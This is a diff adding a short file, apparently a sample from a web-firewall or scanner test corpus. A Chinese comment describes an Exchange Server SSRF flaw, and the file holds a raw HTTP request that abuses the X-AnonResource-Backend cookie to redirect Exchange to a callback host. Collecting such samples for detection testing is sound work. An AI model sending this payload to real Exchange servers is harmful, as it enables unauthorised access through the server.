@@ -1,0 +1,10 @@
+# Microsoft Exchange Server 代码问题漏洞-5100528
+# Exchange服务器端请求伪造（SSRF）漏洞，利用此漏洞的攻击者能够发送任意HTTP请求并通过Exchange Server进行身份验证。
+GET /owa/auth/x.js?acid=80000024&bid=hd_tag_m8mv2489 HTTP/1.1
+Host: www.swaf.com
+Cookie: X-AnonResource=true; X-AnonResource-Backend=http://www.callback.com/ecp/default.flt?~3;
+RM-PRO-BusinessID: hd_tag_m8mv2489
+RM-PRO-Token: 02d6f7d1af0ac6ce0078ab7b0423553c
+RM-PRO-Time: 1742808369821
+User-Agent: curl/7.83.1
+
